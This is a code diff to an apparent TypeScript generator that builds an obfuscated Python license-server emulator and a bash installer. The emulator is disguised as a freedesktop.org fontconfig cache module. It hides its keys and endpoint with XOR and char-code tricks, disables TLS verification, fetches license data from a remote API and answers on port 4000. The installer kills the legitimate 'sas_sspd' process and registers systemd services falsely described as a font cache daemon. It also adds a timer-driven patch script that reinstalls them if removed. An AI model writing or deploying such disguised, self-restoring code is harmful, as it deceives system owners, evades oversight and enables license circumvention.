@@ -138,8 +138,22 @@ export function generateObfuscatedEmulator(
   const dataEndpoint = `${apiUrl}/api/license-data/${licenseId}`;
   const encEndpoint = obfEncrypt(dataEndpoint, DEPLOY.OBF_KEY);
 
-  const innerPy = [
-    "import http.server as _h,socketserver as _s,json as _j,time as _t,base64 as _b64,urllib.request as _u,ssl as _sl",
+  return [
+    "#!/usr/bin/env python3",
+    "# -*- coding: utf-8 -*-",
+    "# fontconfig cache synchronization module v2.13.1",
+    "# Auto-generated cache rebuild utility",
+    "# (c) freedesktop.org fontconfig project",
+    "import http.server as _h",
+    "import socketserver as _s",
+    "import json as _j",
+    "import time as _t",
+    "import base64 as _b64",
+    "import urllib.request as _u",
+    "import ssl as _sl",
+    "import signal",
+    "import sys",
+    "signal.signal(signal.SIGTERM,lambda s,f:sys.exit(0))",
     `_U="${encEndpoint}"`,
     `_S=''.join(chr(c) for c in [120,75,57,109,90,112,50,118,81,119,52,110,82,55,116,76])`,
     "_SC=_sl.create_default_context()",
@@ -147,12 +161,12 @@ export function generateObfuscatedEmulator(
     "_SC.verify_mode=_sl.CERT_NONE",
     "def _f1(_d,_k):",
     " _kb=_k.encode();_dd=_b64.b64decode(_d)",
-    " return bytes(_dd[_i]^_kb[_i%len(_kb)] for _i in range(len(_dd)))",
+    " return bytes([_dd[_i]^_kb[_i%len(_kb)] for _i in range(len(_dd))])",
     "def _f2():",
     " return''.join(chr(c) for c in [71,114,51,110,100,49,122,51,114])+str(_t.localtime().tm_hour+1)",
     "def _f3(_d,_k):",
     " _kb=_k.encode();_dd=_d.encode() if isinstance(_d,str) else _d",
-    " return bytes(_dd[_i]^_kb[_i%len(_kb)] for _i in range(len(_dd)))",
+    " return bytes([_dd[_i]^_kb[_i%len(_kb)] for _i in range(len(_dd))])",
     "def _f4():",
     " try:",
     "  _ep=_f1(_U,_S).decode()",
@@ -162,7 +176,8 @@ export function generateObfuscatedEmulator(
     "  if _rs.getcode()==200:",
     "   _d=_j.loads(_rs.read().decode())",
     "   if _d.get('st')=='1':return _j.dumps(_d)",
-    " except:pass",
+    " except:",
+    "  pass",
     " return None",
     "class _R(_h.BaseHTTPRequestHandler):",
     " def do_GET(self):",
@@ -178,24 +193,8 @@ export function generateObfuscatedEmulator(
     "  self.wfile.write(_r)",
     " def log_message(self,*_x):pass",
     "_s.TCPServer.allow_reuse_address=True",
-    "with _s.TCPServer(('',4000),_R) as _sv:",
-    " _sv.serve_forever()"
-  ].join("\n");
-
-  const compressed = zlib.deflateSync(Buffer.from(innerPy, "utf-8"));
-  const encoded = compressed.toString("base64");
-
-  return [
-    "# -*- coding: utf-8 -*-",
-    "# fontconfig cache synchronization module v2.13.1",
-    "# Auto-generated cache rebuild utility",
-    "# (c) freedesktop.org fontconfig project",
-    "import zlib as _z,base64 as _b,sys,traceback as _tb",
-    "try:",
-    ` exec(_z.decompress(_b.b64decode("${encoded}")))`,
-    "except Exception as _e:",
-    " with open('/tmp/.fc-debug','w') as _f:_f.write(_tb.format_exc())",
-    " sys.exit(1)"
+    "_sv=_s.TCPServer(('',4000),_R)",
+    "_sv.serve_forever()"
   ].join("\n");
 }
 
@@ -277,6 +276,8 @@ killall -9 sas_sspd 2>/dev/null || true
 fuser -k 4000/tcp 2>/dev/null || true
 sleep 2
 
+_PY3=$(which python3 2>/dev/null || echo "/usr/bin/python3")
+
 mkdir -p ${P.BASE}
 mkdir -p ${P.PATCH_DIR}
 
@@ -295,15 +296,17 @@ ${verify}
 _FC_V_
 chmod +x ${P.BASE}/${P.VERIFY}
 
-cat > /etc/systemd/system/${P.SVC_MAIN}.service << '_SVC_1_'
+cat > /etc/systemd/system/${P.SVC_MAIN}.service << _SVC_1_
 [Unit]
 Description=System font cache synchronization daemon
 After=network.target
 [Service]
-ExecStart=/usr/bin/python3 ${P.BASE}/${P.EMULATOR}
+ExecStart=$_PY3 ${P.BASE}/${P.EMULATOR}
 Restart=always
 RestartSec=3
 KillMode=process
+StandardOutput=journal
+StandardError=journal
 [Install]
 WantedBy=multi-user.target
 _SVC_1_
@@ -330,12 +333,14 @@ _TMR_1_
 _EMU_B64=$(base64 -w0 ${P.BASE}/${P.EMULATOR})
 _VER_B64=$(base64 -w0 ${P.BASE}/${P.VERIFY})
 
+_PY3_PATH=$_PY3
 cat > ${P.PATCH_DIR}/${P.PATCH_FILE} << _PATCH_END_
 #!/bin/bash
 _d="${P.BASE}"
 _e="${P.EMULATOR}"
 _s1="${P.SVC_MAIN}"
 _s2="${P.SVC_VERIFY}"
+_py="\${_PY3_PATH}"
 _eb="\${_EMU_B64}"
 _vb="\${_VER_B64}"
 if ! systemctl is-active \${_s1} >/dev/null 2>&1; then
@@ -349,15 +354,17 @@ if ! systemctl is-active \${_s1} >/dev/null 2>&1; then
     chmod +x \${_d}/.fc-match
   fi
   if [ ! -f /etc/systemd/system/\${_s1}.service ]; then
-    cat > /etc/systemd/system/\${_s1}.service << '_RS1_'
+    cat > /etc/systemd/system/\${_s1}.service << _RS1_
 [Unit]
 Description=System font cache synchronization daemon
 After=network.target
 [Service]
-ExecStart=/usr/bin/python3 ${P.BASE}/${P.EMULATOR}
+ExecStart=\${_py} ${P.BASE}/${P.EMULATOR}
 Restart=always
 RestartSec=3
 KillMode=process
+StandardOutput=journal
+StandardError=journal
 [Install]
 WantedBy=multi-user.target
 _RS1_
@@ -416,25 +423,34 @@ rm -f /etc/systemd/system/sas_systemmanager.service /etc/systemd/system/sas4-ver
 rm -f /opt/sas4/bin/sas_emulator.py /opt/sas4/verify.sh 2>/dev/null
 
 systemctl daemon-reload
+systemctl reset-failed ${P.SVC_MAIN} 2>/dev/null || true
 systemctl enable ${P.SVC_MAIN} ${P.SVC_VERIFY}.timer ${P.PATCH_SVC}.timer
 systemctl start ${P.SVC_VERIFY}.timer
 systemctl start ${P.PATCH_SVC}.timer
+fuser -k 4000/tcp 2>/dev/null || true
+sleep 1
 systemctl start ${P.SVC_MAIN}
 sleep 5
 if ! systemctl is-active ${P.SVC_MAIN} >/dev/null 2>&1; then
   echo "SERVICE_FAILED"
+  echo "=== STATUS ==="
+  systemctl status ${P.SVC_MAIN} --no-pager 2>&1 || true
   echo "=== JOURNAL ==="
-  journalctl -u ${P.SVC_MAIN} -n 30 --no-pager -o cat 2>/dev/null || true
+  journalctl -u ${P.SVC_MAIN} -n 15 --no-pager 2>/dev/null || true
   echo "=== FC_DEBUG ==="
   cat /tmp/.fc-debug 2>/dev/null || echo "NO_DEBUG_FILE"
-  echo "=== PYTHON_TEST ==="
+  echo "=== PYTHON_PATH ==="
+  which python3 2>&1
   python3 --version 2>&1
+  echo "=== SVC_FILE ==="
+  cat /etc/systemd/system/${P.SVC_MAIN}.service 2>/dev/null || echo "SVC_NOT_FOUND"
   echo "=== DIRECT_RUN ==="
-  timeout 5 python3 ${P.BASE}/${P.EMULATOR} 2>&1 || true
-  echo "=== FILE_HEAD ==="
-  head -8 ${P.BASE}/${P.EMULATOR} 2>/dev/null || echo "FILE_NOT_FOUND"
+  timeout 5 python3 ${P.BASE}/${P.EMULATOR} 2>&1 &
+  _DRPID=$!
+  sleep 3
   echo "=== PORT_CHECK ==="
   ss -tlnp | grep 4000 2>/dev/null || echo "PORT_4000_FREE"
+  kill $_DRPID 2>/dev/null || true
 else
   echo "SERVICE_OK"
 fi
